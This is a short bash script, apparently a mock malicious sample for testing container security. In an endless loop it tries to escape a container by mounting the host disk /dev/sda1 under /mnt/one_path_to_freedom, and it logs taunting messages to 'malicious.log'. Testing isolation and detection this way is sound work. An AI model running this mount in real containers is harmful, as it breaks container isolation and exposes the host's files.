#!/bin/bash

LOG_NAME="malicious.log"

while true
do
	echo "I WILL MOUNT HOST FS!" >> $LOG_NAME
	mkdir -p /mnt/one_path_to_freedom
        mount /dev/sda1 /mnt/one_path_to_freedom
        echo "BWAHAAA MOUNTED HOST FS!" >> $LOG_NAME
	sleep 130
	
done
